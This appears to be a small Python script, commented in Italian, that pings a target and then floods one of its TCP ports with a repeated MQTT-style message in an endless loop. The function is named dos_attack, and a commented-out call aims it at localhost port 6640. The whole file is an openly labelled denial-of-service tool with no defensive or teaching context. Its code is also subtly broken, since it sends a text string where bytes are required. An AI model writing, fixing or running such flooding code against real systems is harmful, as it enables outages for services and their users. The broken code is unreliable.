import socket
import subprocess


def is_host_reachable(host_ip):
  """Verifica se l'host è raggiungibile.

  Args:
    host_ip: L'indirizzo IP dell'host da verificare.

  Returns:
    True se l'host è raggiungibile, False altrimenti.
  """

  return subprocess.run(["ping", "-c", "3", host_ip],
                         capture_output=True,
                         text=True).returncode == 0
def dos_attack(host,port):
    if not is_host_reachable(host):
        raise ValueError("L'host non è raggiungibile.")
    with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as sock:
        sock.connect((host,port))
        while True:
            message = f"MQTT_MESSAGE\......"
            sock.sendall(message)

#if __name__=="__main__":

   # dos_attack("127.0.0.1",6640)
